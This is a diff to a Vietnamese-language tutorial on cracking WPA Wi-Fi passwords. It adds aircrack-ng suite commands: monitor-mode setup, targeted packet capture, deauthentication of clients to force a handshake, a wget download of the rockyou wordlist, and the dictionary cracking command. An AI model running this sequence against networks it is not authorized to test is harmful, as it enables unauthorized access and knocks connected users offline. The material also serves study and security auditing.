@@ -50,6 +50,10 @@ Nhưng trước khi bật monitor mode, mik cần phải bật airmon-check <br>
 sudo airmon-ng check
 ```
 
+```
+sudo airmon-ng check kill
+```
+
 Sau đó thực hiện bắt tất cả các AP (Access Pointer)
 
 ```
@@ -70,13 +74,25 @@ sudo airodump-ng <interface>
 ***Tấn công = thử tất cả các password của 1 lists***
 
 1. Bật monitor mode của wifi adapter
-2. Dictionary attack required WPA-handshake nên mik sẽ cần bắt những packets đến AP
+
+  
+  
+2. Mik sẽ cần bắt những packets đến AP
+  ```
+  sudo airodump-ng --bssid <BSSID> --channel <CH> --write <output_file> wlan0mon
+  ```
+   
+3. Deauthicate bắt AP thực hiện 4hand-shake
   ```
   sudo aireplay-ng --deauth <# packets> -a <BSSID> -c <CLIENT-MAC> wlan0mon
   ```
-3. Tải rock_you.txt
+4. Tải rock_you.txt
+
+  ```
+  wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+  ```
   
-4. Attack Command
+5. Attack Command
   ```
   sudo aircrack-ng -w <dictionary_file> -b <BSSID> <capture_file>.cap
   ```
